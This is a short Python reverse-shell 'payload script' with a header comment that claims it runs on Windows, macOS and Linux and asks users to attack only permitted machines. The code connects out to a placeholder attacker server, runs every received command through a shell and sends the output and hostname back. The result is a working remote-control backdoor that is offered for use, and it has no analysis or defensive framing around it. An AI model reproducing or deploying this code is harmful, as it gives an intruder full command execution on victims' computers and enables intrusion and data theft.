#IF YOU ARE USING THIS PAYLOAD SCRIPT PLEASE LISTEN. THIS SCRIPT IS BOTH FOR WINDOWS, MAC OS, AND LINUX. AND ENSURE YOU ARE ATTACKING YOUR OWN OR COMPUTERS YOU HAVE PERMENTION TO ATTACK.

import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("YOUR_SERVER_IP", YOUR_PORT))  # Replace YOUR_SERVER_IP and YOUR_PORT with your server's IP and port

    while True:
        command = s.recv(1024).decode()

        if 'exit' in command:
            s.close()
            break
        else:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(socket.gethostname()) + '$ '))

def main():
    connect()

if __name__ == "__main__":
    main()
